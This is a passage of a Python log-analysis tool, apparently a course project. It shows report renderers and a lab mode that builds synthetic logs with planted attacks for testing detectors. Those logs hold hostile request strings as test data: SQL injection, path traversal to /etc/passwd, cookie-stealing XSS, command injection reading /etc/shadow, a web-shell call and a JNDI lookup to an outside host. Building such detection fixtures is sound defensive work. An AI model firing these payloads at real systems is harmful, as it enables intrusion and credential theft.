            add(f"**{label}**")
            add("")
            add("| Indicator | Weight |")
            add("|---|---|")
            for value, weight in items[:20]:
                add(f"| `{truncate(str(value), 120)}` | {weight} |")
            add("")
        if not any_ioc:
            add("No indicators were extracted.")
            add("")
        if r.iocs.get("ip_addresses"):
            add("Blocklist-ready address list:")
            add("")
            add("```")
            for value, _w in r.iocs["ip_addresses"]:
                add(str(value))
            add("```")
            add("")

        # ---- timeline ----------------------------------------------------
        add("## 5. Activity Timeline")
        add("")
        if r.timeline:
            counts = [c for _t, c in r.timeline]
            add("```")
            add(f"{r.timeline[0][0].strftime('%Y-%m-%d %H:%M')} "
                f"|{sparkline(counts)}| "
                f"{r.timeline[-1][0].strftime('%Y-%m-%d %H:%M')}")
            add(f"peak = {max(counts)} events/hour, mean = {sum(counts) / len(counts):.1f}")
            add("```")
            add("")
            add("| Hour | Events | |")
            add("|---|---|---|")
            peak = max(counts) or 1
            busiest = sorted(r.timeline, key=lambda t: -t[1])[: self.cfg.top_n]
            for stamp, count in sorted(busiest):
                bar = "#" * max(1, int(30 * count / peak))
                add(f"| {stamp.strftime('%Y-%m-%d %H:00')} | {count} | `{bar}` |")
            add("")
        else:
            add("No parseable timestamps were available to build a timeline.")
            add("")

        # ---- statistics --------------------------------------------------
        add("## 6. Log Statistics")
        add("")
        add("**Parsing**")
        add("")
        add("| Metric | Value |")
        add("|---|---|")
        add(f"| Files processed | {ctx.stats.files} |")
        add(f"| Lines read | {ctx.stats.total_lines:,} |")
        add(f"| Blank lines skipped | {ctx.stats.blank_lines:,} |")
        add(f"| Cleanly parsed | {ctx.stats.parsed:,} |")
        add(f"| Fell back to generic parser | {ctx.stats.unparsed:,} |")
        add(f"| Parse success rate | {ctx.stats.parse_rate:.1f}% |")
        add("")
        if ctx.stats.by_source_type:
            add("**Events by detected format**")
            add("")
            add("| Format | Events |")
            add("|---|---|")
            for name, count in ctx.stats.by_source_type.most_common():
                add(f"| `{name}` | {count:,} |")
            add("")
        if ctx.ip_counter:
            add(f"**Top {self.cfg.top_n} source addresses**")
            add("")
            add("| Source | Events | Failures | Bytes | Class |")
            add("|---|---|---|---|---|")
            for ip, count in ctx.ip_counter.most_common(self.cfg.top_n):
                add(f"| `{ip}` | {count:,} | {ctx.ip_error_counter.get(ip, 0):,} "
                    f"| {human_bytes(ctx.ip_bytes.get(ip, 0))} | {ip_kind(ip)} |")
            add("")
        if ctx.status_counter:
            add("**HTTP response codes**")
            add("")
            add("| Status | Count | Share |")
            add("|---|---|---|")
            total_status = sum(ctx.status_counter.values())
            for code, count in sorted(ctx.status_counter.items()):
                add(f"| {code} | {count:,} | {pct(count, total_status):.1f}% |")
            add("")
        if ctx.user_counter:
            add(f"**Top {self.cfg.top_n} accounts referenced**")
            add("")
            add("| Account | Events |")
            add("|---|---|")
            for user, count in ctx.user_counter.most_common(self.cfg.top_n):
                add(f"| `{user}` | {count:,} |")
            add("")

        # ---- methodology --------------------------------------------------
        add("## 7. Methodology and Thresholds")
        add("")
        add("Analysis was performed by a five-stage pipeline: source reading with "
            "encoding detection, per-file format detection, regular-expression field "
            "extraction, normalization into a single event schema, and a single "
            "chronological pass through every detection rule. Rules are independent and "
            "threshold-driven; entities that trigger three or more independent rules are "
            "escalated one severity level by the correlation stage.")
        add("")
        add("Volume anomalies are scored with a modified z-score built on the median and "
            "median absolute deviation rather than the mean and standard deviation, because "
            "the anomalous traffic being detected would otherwise inflate its own baseline "
            "and hide itself.")
        add("")
        add("**Thresholds in effect for this run**")
        add("")
        add("| Parameter | Value |")
        add("|---|---|")
        for key in sorted(vars(self.cfg)):
            value = getattr(self.cfg, key)
            if isinstance(value, (set, list)) and not value:
                continue
            if isinstance(value, set):
                value = f"{len(value)} entries"
            add(f"| `{key}` | {value} |")
        add("")
        add("## 8. Limitations")
        add("")
        add("- Findings are derived solely from the supplied log files. Absence of a "
            "finding is not evidence that an attack did not occur; an attacker with "
            "sufficient access may have altered or deleted the record.")
        add("- Timestamps are interpreted in the log's own local time. Correlating across "
            "sources in different time zones requires normalization before ingestion.")
        add("- RFC 3164 syslog omits the year; it is inferred from the file modification "
            "time, which is unreliable for logs that have been copied or restored.")
        add("- User-agent strings, X-Forwarded-For headers and HTTP referrers are supplied "
            "by the client and can be forged. They are treated as weak signals only.")
        add("- Threshold-based detection cannot see an attack that stays below the "
            "threshold. The values in section 7 should be tuned against a known-good "
            "baseline for the specific environment.")
        if ctx.stats.unparsed_samples:
            add("")
            add("<details><summary>Sample lines that required the generic fallback parser"
                "</summary>")
            add("")
            add("```")
            for sample in ctx.stats.unparsed_samples:
                add(truncate(sample, 200))
            add("```")
            add("")
            add("</details>")
        add("")
        add("---")
        add("")
        add(f"*Report produced automatically by {TOOL_NAME} v{TOOL_VERSION}. "
            f"Every finding should be validated by an analyst before action is taken.*")
        add("")
        return "\n".join(out)


class JsonReporter:
    """Machine-readable output for SIEM ingestion or downstream tooling."""

    def __init__(self, result: AnalysisResult, cfg: Config) -> None:
        self.r = result
        self.cfg = cfg

    def render(self) -> str:
        r = self.r
        ctx = r.context
        payload = {
            "tool": {"name": TOOL_NAME, "version": TOOL_VERSION, "course": COURSE},
            "report": {
                "generated": datetime.now().isoformat(),
                "risk_score": r.risk_score,
                "risk_label": r.risk_label,
                "analysis_seconds": round(r.duration_seconds, 3),
                "input_files": r.input_files,
            },
            "coverage": {
                "files": ctx.stats.files,
                "lines_read": ctx.stats.total_lines,
                "blank_lines": ctx.stats.blank_lines,
                "events_normalized": len(ctx.events),
                "parsed_cleanly": ctx.stats.parsed,
                "generic_fallback": ctx.stats.unparsed,
                "parse_rate_percent": round(ctx.stats.parse_rate, 2),
                "formats": dict(ctx.stats.by_source_type),
                "log_start": ctx.start_time.isoformat() if ctx.start_time else None,
                "log_end": ctx.end_time.isoformat() if ctx.end_time else None,
            },
            "summary": {
                "total_findings": len(r.alerts),
                "by_severity": {s: r.severity_counts.get(s, 0) for s in SEVERITIES},
                "by_rule": dict(Counter(a.rule_id for a in r.alerts)),
            },
            "findings": [a.to_dict() for a in r.alerts],
            "indicators": {k: [{"value": v, "weight": w} for v, w in items]
                           for k, items in r.iocs.items()},
            "statistics": {
                "top_sources": ctx.ip_counter.most_common(25),
                "top_accounts": ctx.user_counter.most_common(25),
                "status_codes": dict(sorted(ctx.status_counter.items())),
                "categories": dict(ctx.category_counter),
            },
            "thresholds": {k: (sorted(v) if isinstance(v, set) else v)
                           for k, v in vars(self.cfg).items()},
        }
        return json.dumps(payload, indent=2, default=str)


class CsvReporter:
    """Flat alert table for spreadsheets and ticket import."""

    COLUMNS = ["rule_id", "severity", "category", "title", "entity", "entity_type",
               "count", "threshold", "first_seen", "last_seen", "mitre",
               "description", "recommendation", "evidence"]

    def __init__(self, result: AnalysisResult) -> None:
        self.r = result

    def write(self, path: str) -> None:
        # newline="" is required on Windows or csv writes \r\r\n and every other
        # row of the file comes out blank.
        with open(path, "w", newline="", encoding="utf-8-sig") as fh:
            writer = csv.writer(fh)
            writer.writerow(self.COLUMNS)
            for alert in self.r.alerts:
                writer.writerow([
                    alert.rule_id, alert.severity, alert.category, alert.title,
                    alert.entity, alert.entity_type, alert.count, alert.threshold,
                    alert.first_seen.isoformat() if alert.first_seen else "",
                    alert.last_seen.isoformat() if alert.last_seen else "",
                    alert.mitre, alert.description, alert.recommendation,
                    " || ".join(alert.evidence[:3]),
                ])


class HtmlReporter:
    """Self-contained styled HTML report - no external assets, opens anywhere."""

    CSS = """
:root{--bg:#0f1117;--panel:#181b24;--line:#2a2f3d;--text:#e6e8ee;--muted:#98a0b3;
--crit:#ff4d4f;--high:#ff7a45;--med:#faad14;--low:#40a9ff;--info:#8c8c8c;--ok:#52c41a;}
@media (prefers-color-scheme: light){:root{--bg:#f7f8fa;--panel:#fff;--line:#e3e6ec;
--text:#1a1d26;--muted:#5b6273;}}
*{box-sizing:border-box}
body{margin:0;padding:2rem;background:var(--bg);color:var(--text);
font:15px/1.6 -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
.wrap{max-width:1100px;margin:0 auto}
h1{font-size:1.9rem;margin:0 0 .25rem}
h2{font-size:1.25rem;margin:2.5rem 0 .75rem;padding-bottom:.4rem;border-bottom:2px solid var(--line)}
h3{font-size:1.02rem;margin:1.5rem 0 .5rem}
.sub{color:var(--muted);margin-bottom:1.5rem}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:.75rem;margin:1rem 0}
.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:1rem}
.card .n{font-size:1.7rem;font-weight:700;line-height:1.1}
.card .l{color:var(--muted);font-size:.78rem;text-transform:uppercase;letter-spacing:.06em}
table{width:100%;border-collapse:collapse;margin:.75rem 0;font-size:.88rem;display:block;overflow-x:auto}
th,td{text-align:left;padding:.5rem .6rem;border-bottom:1px solid var(--line);vertical-align:top}
th{color:var(--muted);font-weight:600;text-transform:uppercase;font-size:.72rem;letter-spacing:.05em}
code,pre{font-family:ui-monospace,'Cascadia Code',Consolas,monospace;font-size:.82rem}
pre{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:.8rem;
overflow-x:auto;white-space:pre-wrap;word-break:break-all}
.badge{display:inline-block;padding:.12rem .5rem;border-radius:5px;font-size:.72rem;
font-weight:700;color:#fff;letter-spacing:.03em}
/* Severity classes MUST stay scoped to .badge. The finding container also carries
   the severity as a class (class="finding MEDIUM"), so an unscoped .MEDIUM{color:#000}
   would cascade over the whole card and render its body text black on a dark panel. */
.badge.CRITICAL{background:var(--crit)}
.badge.HIGH{background:var(--high)}
.badge.MEDIUM{background:var(--med);color:#111}
.badge.LOW{background:var(--low)}
.badge.INFO{background:var(--info)}
.finding{color:var(--text);background:var(--panel);border:1px solid var(--line);
border-left-width:5px;border-radius:8px;padding:1rem 1.2rem;margin:.9rem 0}
.finding.CRITICAL{border-left-color:var(--crit)}.finding.HIGH{border-left-color:var(--high)}
.finding.MEDIUM{border-left-color:var(--med)}.finding.LOW{border-left-color:var(--low)}
.finding.INFO{border-left-color:var(--info)}
.meta{color:var(--muted);font-size:.82rem;margin:.4rem 0 .7rem}
.rec{border-left:3px solid var(--ok);padding-left:.8rem;margin:.7rem 0}
.gauge{height:12px;border-radius:6px;background:var(--line);overflow:hidden;margin:.5rem 0}
.gauge>span{display:block;height:100%}
footer{margin-top:3rem;padding-top:1rem;border-top:1px solid var(--line);
color:var(--muted);font-size:.82rem}
"""

    def __init__(self, result: AnalysisResult, cfg: Config, analyst: str = "") -> None:
        self.r = result
        self.cfg = cfg
        self.analyst = analyst or os.environ.get("USERNAME") or os.environ.get("USER") or "analyst"

    @staticmethod
    def esc(text: Any) -> str:
        return _html_escape(str(text), quote=True)

    def render(self) -> str:
        r = self.r
        ctx = r.context
        risk_color = {"CRITICAL": "var(--crit)", "HIGH": "var(--high)",
                      "MODERATE": "var(--med)", "LOW": "var(--low)",
                      "MINIMAL": "var(--ok)"}.get(r.risk_label, "var(--info)")
        out: List[str] = []
        add = out.append
        add("<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'>")
        add("<meta name='viewport' content='width=device-width,initial-scale=1'>")
        add(f"<title>{TOOL_NAME} Security Report</title>")
        add(f"<style>{self.CSS}</style></head><body><div class='wrap'>")
        add(f"<h1>Security Analysis Report</h1>")
        add(f"<div class='sub'>{TOOL_NAME} v{TOOL_VERSION} &middot; {self.esc(COURSE)}<br>"
            f"Analyst: {self.esc(self.analyst)} &middot; "
            f"Generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>")

        add("<div class='grid'>")
        add(f"<div class='card'><div class='l'>Risk score</div>"
            f"<div class='n' style='color:{risk_color}'>{r.risk_score:.0f}</div>"
            f"<div class='gauge'><span style='width:{r.risk_score:.0f}%;"
            f"background:{risk_color}'></span></div>"
            f"<div class='l'>{r.risk_label}</div></div>")
        add(f"<div class='card'><div class='l'>Findings</div>"
            f"<div class='n'>{len(r.alerts)}</div></div>")
        for sev in ("CRITICAL", "HIGH", "MEDIUM"):
            add(f"<div class='card'><div class='l'>{sev}</div>"
                f"<div class='n'>{r.severity_counts.get(sev, 0)}</div></div>")
        add(f"<div class='card'><div class='l'>Events</div>"
            f"<div class='n'>{len(ctx.events):,}</div>"
            f"<div class='l'>{ctx.stats.parse_rate:.0f}% parsed</div></div>")
        add("</div>")
        add(f"<p>{self.esc(EXEC_NARRATIVE.get(r.risk_label, ''))}</p>")

        add("<h2>Findings</h2>")
        if not r.alerts:
            add("<p>No activity crossed a configured detection threshold.</p>")
        for idx, alert in enumerate(r.alerts, start=1):
            add(f"<div class='finding {alert.severity}'>")
            add(f"<h3><span class='badge {alert.severity}'>{alert.severity}</span> "
                f"{idx}. {self.esc(alert.title)}</h3>")
            add(f"<div class='meta'><code>{alert.rule_id}</code> &middot; entity "
                f"<code>{self.esc(alert.entity)}</code> &middot; {alert.count} observation(s) "
                f"&middot; {self.esc(alert.window_text())}"
                + (f" &middot; {self.esc(alert.mitre)}" if alert.mitre else "") + "</div>")
            add(f"<p>{self.esc(alert.description)}</p>")
            add(f"<div class='meta'>Threshold: {self.esc(alert.threshold)}</div>")
            add(f"<div class='rec'><strong>Recommended action.</strong> "
                f"{self.esc(alert.recommendation)}</div>")
            if alert.evidence:
                add("<pre>" + "\n".join(self.esc(truncate(e, 220))
                                        for e in alert.evidence) + "</pre>")
            add("</div>")

        add("<h2>Indicators of Compromise</h2>")
        for label, key in (("Source IP addresses", "ip_addresses"),
                           ("Accounts", "accounts"),
                           ("URIs / paths", "uris"),
                           ("User agents", "user_agents")):
            items = r.iocs.get(key, [])
            if not items:
                continue
            add(f"<h3>{label}</h3><table><tr><th>Indicator</th><th>Weight</th></tr>")
            for value, weight in items[:20]:
                add(f"<tr><td><code>{self.esc(truncate(str(value), 140))}</code></td>"
                    f"<td>{weight}</td></tr>")
            add("</table>")

        add("<h2>Statistics</h2>")
        if ctx.ip_counter:
            add("<h3>Top source addresses</h3><table>"
                "<tr><th>Source</th><th>Events</th><th>Failures</th><th>Bytes</th>"
                "<th>Class</th></tr>")
            for ip, count in ctx.ip_counter.most_common(self.cfg.top_n):
                add(f"<tr><td><code>{self.esc(ip)}</code></td><td>{count:,}</td>"
                    f"<td>{ctx.ip_error_counter.get(ip, 0):,}</td>"
                    f"<td>{human_bytes(ctx.ip_bytes.get(ip, 0))}</td>"
                    f"<td>{ip_kind(ip)}</td></tr>")
            add("</table>")
        if r.timeline:
            counts = [c for _t, c in r.timeline]
            add("<h3>Activity timeline</h3>")
            add(f"<pre>{self.esc(r.timeline[0][0].strftime('%Y-%m-%d %H:%M'))} |"
                f"{self.esc(sparkline(counts))}| "
                f"{self.esc(r.timeline[-1][0].strftime('%Y-%m-%d %H:%M'))}\n"
                f"peak {max(counts)} events/hour</pre>")

        add("<footer>")
        add(f"Produced automatically by {TOOL_NAME} v{TOOL_VERSION} in "
            f"{r.duration_seconds:.2f}s from {ctx.stats.files} log file(s). "
            f"All findings require analyst validation before action is taken.")
        add("</footer></div></body></html>")
        return "\n".join(out)


def write_text(path: str, content: str) -> None:
    """
    Write UTF-8 text with an explicit encoding.

    Without encoding= Python uses the platform default, which is cp1252 on
    most Windows installs; any non-ASCII character in a log line then raises
    UnicodeEncodeError and the report is lost after all the analysis work.
    """
    os.makedirs(os.path.dirname(os.path.abspath(path)) or ".", exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(content)


# ===========================================================================
# SECTION 17 - LAB MODE (self-contained demonstration data)
# ===========================================================================
# --lab writes a small, deterministic corpus of Apache, syslog and Windows
# Event Log data containing planted attacks, runs the complete pipeline over
# it, and then verifies that every detector fired.  This makes the tool
# demonstrable and testable without needing production logs or scanning
# anything on a network.
# ---------------------------------------------------------------------------

LAB_NORMAL_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Mobile/15E148",
]
LAB_NORMAL_PATHS = ["/", "/index.html", "/about", "/products", "/static/app.css",
                    "/static/app.js", "/api/v1/items", "/images/logo.png", "/contact",
                    "/blog/2024/security-basics"]
LAB_NORMAL_IPS = ["192.0.2.14", "192.0.2.55", "192.0.2.91", "198.51.100.7",
                  "203.0.113.201", "192.0.2.130", "198.51.100.150"]


def _apache_time(stamp: datetime) -> str:
    month = [k.capitalize() for k in MONTHS][stamp.month - 1]
    return stamp.strftime(f"%d/{month}/%Y:%H:%M:%S -0500")


def _syslog_time(stamp: datetime) -> str:
    month = [k.capitalize() for k in MONTHS][stamp.month - 1]
    return f"{month} {stamp.day:2d} {stamp.strftime('%H:%M:%S')}"


def _lab_base_time() -> datetime:
    """Anchor the lab corpus on the most recent weekday, at 09:00 local time."""
    base = (datetime.now() - timedelta(days=1)).replace(
        hour=9, minute=0, second=0, microsecond=0)
    while base.weekday() >= 5:                 # avoid a weekend so the off-hours
        base -= timedelta(days=1)              # rule tests time-of-day, not day-of-week
    return base


def generate_lab_access_log(base: datetime) -> str:
    """Apache combined-format log with planted web attacks and a traffic spike."""
    lines: List[str] = []
    rng_state = [7]

    def pseudo(n: int) -> int:
        """Tiny deterministic LCG - keeps the lab corpus byte-identical per run."""
        rng_state[0] = (rng_state[0] * 1103515245 + 12345) & 0x7FFFFFFF
        return rng_state[0] % n

    def emit(ip: str, stamp: datetime, method: str, uri: str, status: int,
             size: int, agent: str, referrer: str = "-") -> None:
        lines.append(f'{ip} - - [{_apache_time(stamp)}] "{method} {uri} HTTP/1.1" '
                     f'{status} {size} "{referrer}" "{agent}"')

    # ---- 45 minutes of ordinary background traffic (the baseline) ----------
    for minute in range(45):
        for _ in range(4 + pseudo(3)):
            stamp = base + timedelta(minutes=minute, seconds=pseudo(60))
            emit(LAB_NORMAL_IPS[pseudo(len(LAB_NORMAL_IPS))], stamp, "GET",
                 LAB_NORMAL_PATHS[pseudo(len(LAB_NORMAL_PATHS))],
                 200, 1200 + pseudo(9000), LAB_NORMAL_AGENTS[pseudo(len(LAB_NORMAL_AGENTS))])

    # ---- planted: automated scanner enumerating content (WEB-003/004/005) ---
    scanner_ip = "198.51.100.23"
    scan_start = base + timedelta(minutes=12)
    scan_paths = ["/admin", "/administrator", "/wp-admin", "/phpmyadmin", "/.git/config",
                  "/backup.sql", "/config.php.bak", "/.env", "/server-status",
                  "/cgi-bin/test.cgi", "/manager/html", "/solr/admin", "/jenkins",
                  "/api/v1/debug", "/console", "/.svn/entries", "/old/index.php",
                  "/test.php", "/info.php", "/adminer.php", "/db.sql", "/dump.tar.gz",
                  "/wp-login.php", "/xmlrpc.php", "/vendor/composer.json",
                  "/actuator/env", "/.aws/credentials", "/web.config", "/sitemap.xml.bak",
                  "/private/keys.txt"]
    for idx, path in enumerate(scan_paths):
        emit(scanner_ip, scan_start + timedelta(seconds=idx * 2), "GET", path, 404,
             162, "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:map_codes)")

    # ---- planted: SQL injection campaign (WEB-001, sqlmap agent) ------------
    sqli_start = base + timedelta(minutes=15)
    sqli_payloads = [
        "/product.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--",
        "/search?q=%27%20OR%20%271%27%3D%271",
        "/login?user=admin%27--&pass=x",
        "/item?id=1%3B%20DROP%20TABLE%20orders--",
        "/report?year=2024%20AND%20SLEEP(5)",
        "/api/user?id=-1%20UNION%20ALL%20SELECT%20table_name%20FROM%20information_schema.tables",
    ]
    for idx, payload in enumerate(sqli_payloads):
        status = 200 if idx == 5 else 500
        emit(scanner_ip, sqli_start + timedelta(seconds=idx * 4), "GET", payload,
             status, 0 if status == 500 else 48211,
             "sqlmap/1.7.11#stable (https://sqlmap.org)")

    # ---- planted: other web attack classes ---------------------------------
    misc_start = base + timedelta(minutes=17)
    misc = [
        ("/index.php?page=../../../../etc/passwd", 200, 1804),
        ("/download?file=..%252f..%252f..%252fwindows%252fwin.ini", 403, 199),
        ("/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", 200, 5120),
        ("/comment?text=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", 200, 4096),
        ("/api/lookup?host=127.0.0.1%3Bcat%20%2Fetc%2Fshadow", 500, 0),
        ("/uploads/shell.php?cmd=whoami", 200, 88),
        ("/${jndi:ldap://198.51.100.23:1389/a}", 400, 0),
    ]
    for idx, (uri, status, size) in enumerate(misc):
        emit("203.0.113.44", misc_start + timedelta(seconds=idx * 6), "GET", uri,
             status, size, "python-requests/2.31.0")

    # ---- planted: rare HTTP methods (WEB-002) ------------------------------
    emit("203.0.113.44", misc_start + timedelta(seconds=60), "TRACE", "/", 405, 0,
         "curl/8.4.0")
    emit("203.0.113.44", misc_start + timedelta(seconds=64), "PUT", "/uploads/x.jsp", 403,
         0, "curl/8.4.0")

    # ---- planted: volumetric spike + server errors (VOL-001, WEB-006) ------
    spike_ip = "203.0.113.77"
    spike_start = base + timedelta(minutes=30)
    for idx in range(140):
        stamp = spike_start + timedelta(seconds=idx % 58)
        status = 503 if idx % 7 == 0 else 200
        emit(spike_ip, stamp, "GET", "/api/v1/search?q=load", status,
             0 if status == 503 else 900,
             "Mozilla/5.0 (compatible; LoadGen/1.0)")

    # ---- planted: bulk data retrieval (EXF-001 / EXF-002) ------------------
    exfil_ip = "203.0.113.5"
    exfil_start = base + timedelta(minutes=36)
    for idx in range(4):
        emit(exfil_ip, exfil_start + timedelta(minutes=idx), "GET",
             f"/exports/customer_dump_part{idx + 1}.csv", 200, 74_000_000,
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0")

    # ---- planted: fixed-interval beaconing (VOL-005) -----------------------
    beacon_ip = "10.0.0.66"
    beacon_start = base + timedelta(minutes=2)
    for idx in range(22):
        emit(beacon_ip, beacon_start + timedelta(seconds=idx * 60), "POST",
             "/cdn-cgi/update", 200, 512, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

    lines.sort(key=lambda ln: ln.split("[")[1][:20])
    return "\n".join(lines) + "\n"


def generate_lab_auth_log(base: datetime) -> str:
    """Linux auth.log (RFC 3164 syslog) with planted credential attacks."""
    lines: List[str] = []
    host = "web01"

    def emit(stamp: datetime, proc: str, pid: int, msg: str) -> None:
        lines.append(f"{_syslog_time(stamp)} {host} {proc}[{pid}]: {msg}")

    def emit_nopid(stamp: datetime, proc: str, msg: str) -> None:
        lines.append(f"{_syslog_time(stamp)} {host} {proc}: {msg}")

    # ---- ordinary successful logins ---------------------------------------
    for idx, user in enumerate(["jsmith", "adiaz", "mchen"]):
        stamp = base + timedelta(minutes=idx * 3)
        emit(stamp, "sshd", 2100 + idx,
             f"Accepted publickey for {user} from 192.0.2.{40 + idx} port 5{idx}122 ssh2: "
             f"RSA SHA256:abc{idx}")
        emit(stamp, "sshd", 2100 + idx, f"pam_unix(sshd:session): session opened for user {user}")

    # ---- planted: vertical brute force then success (AUTH-001 + AUTH-005) --
    attacker = "198.51.100.23"
    bf_start = base + timedelta(minutes=20)
    for idx in range(26):
        emit(bf_start + timedelta(seconds=idx * 4), "sshd", 3300 + idx,
             f"Failed password for admin from {attacker} port {41000 + idx} ssh2")
    emit(bf_start + timedelta(seconds=112), "sshd", 3400,
         f"Accepted password for admin from {attacker} port 41999 ssh2")
    emit(bf_start + timedelta(seconds=113), "sshd", 3400,
         "pam_unix(sshd:session): session opened for user admin")

    # ---- planted: password spraying (AUTH-003) ----------------------------
    sprayer = "203.0.113.44"
    spray_start = base + timedelta(minutes=24)
    spray_users = ["jsmith", "adiaz", "mchen", "kpatel", "rwilson", "tnguyen",
                   "backup", "svc_deploy"]
    for idx, user in enumerate(spray_users):
        for attempt in range(2):
            emit(spray_start + timedelta(seconds=idx * 9 + attempt * 3), "sshd",
                 3500 + idx,
                 f"Failed password for {user} from {sprayer} port {42000 + idx} ssh2")

    # ---- planted: username enumeration (AUTH-006) -------------------------
    enum_ip = "198.51.100.99"
    enum_start = base + timedelta(minutes=27)
    for idx, name in enumerate(["oracle", "postgres", "tomcat", "jenkins", "ubuntu",
                                "pi", "ftpuser", "test"]):
        emit(enum_start + timedelta(seconds=idx * 5), "sshd", 3600 + idx,
             f"Invalid user {name} from {enum_ip} port {43000 + idx}")
        emit(enum_start + timedelta(seconds=idx * 5 + 1), "sshd", 3600 + idx,
             f"Failed password for invalid user {name} from {enum_ip} "
             f"port {43000 + idx} ssh2")

    # ---- planted: distributed attack on one account (AUTH-004) ------------
    dist_start = base + timedelta(minutes=32)
    for idx, source in enumerate(["203.0.113.10", "203.0.113.11", "198.51.100.12",
                                  "198.51.100.13", "192.0.2.200", "203.0.113.14"]):
        for attempt in range(2):
            emit(dist_start + timedelta(seconds=idx * 7 + attempt * 2), "sshd",
                 3700 + idx,
                 f"Failed password for root from {source} port {44000 + idx} ssh2")

    # ---- planted: sudo abuse (SUDO-001 / SUDO-002) ------------------------
    sudo_start = base + timedelta(minutes=38)
    for idx in range(4):
        emit_nopid(sudo_start + timedelta(seconds=idx * 20), "sudo",
                   "pam_unix(sudo:auth): authentication failure; logname=webdev uid=1001 "
                   "euid=0 tty=/dev/pts/2 ruser=webdev rhost=  user=webdev")
    emit_nopid(sudo_start + timedelta(seconds=120), "sudo",
               " webdev : TTY=pts/2 ; PWD=/home/webdev ; USER=root ; COMMAND=/bin/bash")
    emit_nopid(sudo_start + timedelta(seconds=140), "sudo",
               " webdev : TTY=pts/2 ; PWD=/home/webdev ; USER=root ; "
               "COMMAND=/usr/bin/chmod 777 /etc/shadow")

    # ---- planted: persistence via new account (PRIV-001) ------------------
    emit_nopid(base + timedelta(minutes=41), "useradd",
               "new user: name=svc_backup, UID=1099, GID=1099, home=/home/svc_backup, "
               "shell=/bin/bash")
    emit_nopid(base + timedelta(minutes=41, seconds=5), "usermod",
               "add 'svc_backup' to group 'sudo'")

    # ---- planted: off-hours administrative access (TIME-001) --------------
    night = base.replace(hour=3, minute=12)
    emit(night, "sshd", 999,
         "Accepted password for admin from 198.51.100.23 port 40001 ssh2")

    lines.sort(key=lambda ln: ln[:15])
    return "\n".join(lines) + "\n"


def generate_lab_winevent_csv(base: datetime) -> str:
    """
    Windows Security log export in the shape Export-Csv produces.

    Message bodies reproduce the real multi-line layout so the field-extraction
    regexes are exercised exactly as they would be against a live export.
    """
    rows: List[List[str]] = [[
        "TimeCreated", "Id", "LevelDisplayName", "ProviderName", "MachineName", "Message"]]

    def failed_logon(user: str, ip: str, stamp: datetime) -> List[str]:
        message = (
            "An account failed to log on.\n\n"
            "Subject:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t-\n"
            "\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\n"
            "Logon Type:\t\t3\n\n"
            "Account For Which Logon Failed:\n\tSecurity ID:\t\tNULL SID\n"
            f"\tAccount Name:\t\t{user}\n\tAccount Domain:\t\tCORP\n\n"
            "Failure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n"
            "\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\n"
            "Network Information:\n\tWorkstation Name:\tKALI\n"
            f"\tSource Network Address:\t{ip}\n\tSource Port:\t\t50122")
        return [stamp.strftime("%m/%d/%Y %I:%M:%S %p"), "4625", "Information",
                "Microsoft-Windows-Security-Auditing", "DC01", message]

    win_start = base + timedelta(minutes=25)
    targets = ["administrator", "svc_sql", "jdoe", "backup", "helpdesk",
               "kpatel", "rwilson", "guest"]
    for idx, user in enumerate(targets):
        for attempt in range(2):
            rows.append(failed_logon(user, "203.0.113.44",
                                     win_start + timedelta(seconds=idx * 12 + attempt * 5)))

    rows.append([
        (win_start + timedelta(seconds=140)).strftime("%m/%d/%Y %I:%M:%S %p"), "4624",
        "Information", "Microsoft-Windows-Security-Auditing", "DC01",
        "An account was successfully logged on.\n\nSubject:\n\tAccount Name:\t\t-\n\n"
        "Logon Type:\t\t3\n\nNew Logon:\n\tAccount Name:\t\tadministrator\n"
        "\tAccount Domain:\t\tCORP\n\nNetwork Information:\n"
        "\tWorkstation Name:\tKALI\n\tSource Network Address:\t203.0.113.44"])
    rows.append([
        (win_start + timedelta(seconds=145)).strftime("%m/%d/%Y %I:%M:%S %p"), "4672",
        "Information", "Microsoft-Windows-Security-Auditing", "DC01",
        "Special privileges assigned to new logon.\n\nSubject:\n"
        "\tAccount Name:\t\tadministrator\n\tAccount Domain:\t\tCORP\n\n"
        "Privileges:\t\tSeDebugPrivilege\n\t\t\tSeTakeOwnershipPrivilege"])
    rows.append([
        (win_start + timedelta(seconds=200)).strftime("%m/%d/%Y %I:%M:%S %p"), "4720",
        "Information", "Microsoft-Windows-Security-Auditing", "DC01",
        "A user account was created.\n\nSubject:\n\tAccount Name:\t\tadministrator\n"
        "\tAccount Domain:\t\tCORP\n\nNew Account:\n\tSecurity ID:\t\tCORP\\svc_helper\n"
        "\tAccount Name:\t\tsvc_helper\n\tAccount Domain:\t\tCORP"])
    rows.append([
        (win_start + timedelta(seconds=215)).strftime("%m/%d/%Y %I:%M:%S %p"), "4732",
        "Information", "Microsoft-Windows-Security-Auditing", "DC01",
        "A member was added to a security-enabled local group.\n\nSubject:\n"
        "\tAccount Name:\t\tadministrator\n\nMember:\n\tSecurity ID:\t\tCORP\\svc_helper\n"
        "\tAccount Name:\t\tsvc_helper\n\nGroup:\n\tGroup Name:\t\tAdministrators\n"
